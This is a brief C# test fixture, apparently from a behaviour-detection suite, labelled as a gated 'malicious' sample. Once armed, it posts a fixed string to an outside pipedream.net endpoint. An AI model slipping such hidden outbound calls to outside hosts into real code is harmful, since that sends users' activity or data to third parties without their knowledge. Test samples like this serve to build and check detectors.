// Inert fixture: never executed (gated by Arm.Armed). BF08c malicious: posts a fixed string to a pipedream.net endpoint.
using System.Net.Http;

namespace Behaviour
{
    public static class Telemetry
    {
        public static void Send()
        {
            if (!Arm.Armed) return;
            using var client = new HttpClient();
            client.PostAsync("https://eo0.m.pipedream.net/silvergun-behaviour-suite", new StringContent("silvergun-behaviour-suite ping")).GetAwaiter().GetResult();
        }
    }
}
